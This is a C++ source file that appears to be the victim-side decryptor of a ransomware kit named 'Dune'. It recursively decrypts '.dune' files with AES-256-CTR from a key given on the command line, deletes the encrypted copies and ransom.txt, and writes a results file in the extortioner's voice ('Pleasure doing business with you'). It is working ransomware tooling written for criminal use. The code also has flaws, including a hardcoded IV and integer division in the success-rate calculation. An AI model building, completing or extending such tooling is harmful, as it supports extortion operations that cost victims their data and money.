#ifndef __DUNE__
#define __DUNE__

#include <string>
#include <fstream>
#include <vector>
#include <filesystem>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

static void ls_recursive(const std::filesystem::path &path, std::vector<std::string> *files)
{
    for (const auto &p : std::filesystem::recursive_directory_iterator(path))
    {
        if (!std::filesystem::is_directory(p))
        {
            files->push_back(p.path());
        }
    }
}

static inline void decrypt_file(std::string full_path, std::string enc_key)
{
    FILE *infile = fopen(full_path.c_str(), "rb"); // must be open in read mode + binary
    if (!infile)
    {
        return;
    }

    FILE *outfile = fopen((full_path.substr(0, full_path.length() - 5)).c_str(), "w+b");
    if (!outfile)
    {
        return;
    }
    int bytes_read;
    unsigned char indata[AES_BLOCK_SIZE];
    unsigned char outdata[AES_BLOCK_SIZE];
    unsigned char *ckey = (unsigned char *)enc_key.c_str();
    unsigned char ivec[] = "dontusethisinput";

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    const EVP_CIPHER *cipher = EVP_aes_256_ctr();
    EVP_DecryptInit(ctx, cipher, ckey, ivec);
    while (1)
    {
        bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
        int outlen;
        EVP_DecryptUpdate(ctx, outdata, &outlen, indata, bytes_read);
        fwrite(outdata, 1, bytes_read, outfile);
        if (bytes_read < AES_BLOCK_SIZE)
            break;
    }
    EVP_CIPHER_CTX_free(ctx);
    fclose(infile);
    fclose(outfile);
}

static void decrypt_files(std::string enc_key, std::string user_home)
{
    std::vector<std::string> files_to_decrypt;
    ls_recursive(user_home, &files_to_decrypt);
    if (files_to_decrypt.size() == 0)
    {
        return;
    }
    uint64_t totalFilesOnSystem = files_to_decrypt.size();
    uint64_t totalNonDuneFiles = 0;
    uint64_t filesDecrypted = 0;
    for (uint64_t i = 0; i < files_to_decrypt.size(); i++)
    {
        try
        {
            if (files_to_decrypt[i].find(".dune") == std::string::npos)
            {
                totalNonDuneFiles++;
                continue;
            }
            decrypt_file(files_to_decrypt[i], enc_key);
            filesDecrypted++;
            remove((files_to_decrypt[i]).c_str());
        }
        catch (...)
        {
        }
    }
    remove("ransom.txt");
    remove("finish.txt");
    std::ofstream finish("./finish.txt");
    std::string done_msg;
    done_msg += "You made the right choice.\n\nStatistics: ";
    done_msg += "Total files seen on system to process for decryption: " + std::to_string(totalFilesOnSystem) + "\n";
    done_msg += "Total files processed that are not encrypted with Dune: " + std::to_string(totalNonDuneFiles) + "\n";
    done_msg += "Total files decrypted with decryptor: " + std::to_string(filesDecrypted) + "\n";
    int result;
    if ((totalFilesOnSystem - totalNonDuneFiles) != 0) {
        result = (filesDecrypted / (totalFilesOnSystem - totalNonDuneFiles)) * 100;
    } else {
        result = 0;
    }
    done_msg += "Decryptor success rate (decryped / (total_files - non_dune_files)): " + std::to_string(result) + " %\n\n";
    done_msg += "You can now safly delete any ransomware files. Unless there were problems decrypting.\n";
    done_msg += "This encryption software is guaranteed to work. Only if you entered the right key. If you did not then all of your files are corrupted and we cant help you.\n";
    done_msg += "Pleasure doing business with you\n\n";
    finish.write(done_msg.c_str(), done_msg.length());
    finish.close();
    return;
}
std::vector<char> HexToBytes(const std::string &hex)
{
    std::vector<char> bytes;

    for (unsigned int i = 0; i < hex.length(); i += 2)
    {
        std::string byteString = hex.substr(i, 2);
        char byte = (char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }

    return bytes;
}

int main(int argc, char *argv[])
{
    std::vector<std::string> arguments(argv + 1, argv + argc);
    std::string enc_key;
    for (uint64_t i = 0; i < arguments.size(); i++)
    {
        if (arguments[i] == "--key")
        {
            if (arguments.size() > (i + 1))
            {
                enc_key = arguments[i + 1];
            }
        }
    }
    if (enc_key.empty())
    {
        printf("WARNING: If you mistype the key all your files will be corrupted.\nMake sure you copy and paste it exactly. Only one key is valid.\nWe recommend copying an encrypted text file onto another drive and testing the decryptor on it.\nIf the file comes out as gibberish then the key is invalid.\nIf this is the case DO NOT run it in the main directory or you will loose all your files.\nIf the file you test decrypts successfuly then it is safe to decrypt.\n\n");
        printf("Key required\n");
        printf("Specify key in hex format with the --key flag.\n.Example: ./decryptor --key 8bed8ad73fee0051896448fa3c1a488327cde3d167047b85a98ad18f755c229f\n\nMake sure to substitute your key.\n");
        return -1;
    }
    if (HexToBytes(enc_key).size() != 32) {
        printf("WARNING: Invalid key. Careful. Key must be 256 bits or 32 Bytes or 64 hex chars.");
        return -1;
    }
    std::string decoded_key = std::string(HexToBytes(enc_key).data(),32);
    decrypt_files(decoded_key, "./");
    printf("Done.\nRead the finish.txt file for results. Location: ./finish.txt\n");
}

#endif